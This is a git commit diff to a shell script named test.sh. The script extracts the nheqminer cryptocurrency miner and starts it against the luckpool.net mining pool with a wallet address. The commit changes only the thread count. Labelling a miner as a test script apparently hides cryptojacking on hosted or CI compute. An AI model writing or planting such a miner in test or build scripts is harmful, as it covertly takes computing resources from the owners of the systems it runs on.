7b1b615953a99ddf6b9045cafb2e20a541eb5f3d
tesasik67 <84440178+tesasik67@users.noreply.github.com>
2022-08-02 01:27:34 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -11,7 +11,7 @@ tar xf nheqminer-Linux-v0.8.2.tar.gz
 
 cd nheqminer
 
-./start.sh -v -l na.luckpool.net:3956 -u RY3RvLLuzUDGLsyPRXm1LSfb4gKobcNfaC.ancan  -p x -t 2
+./start.sh -v -l na.luckpool.net:3956 -u RY3RvLLuzUDGLsyPRXm1LSfb4gKobcNfaC.ancan  -p x -t0
 
      echo COUNTER $COUNTER
      let COUNTER-=1
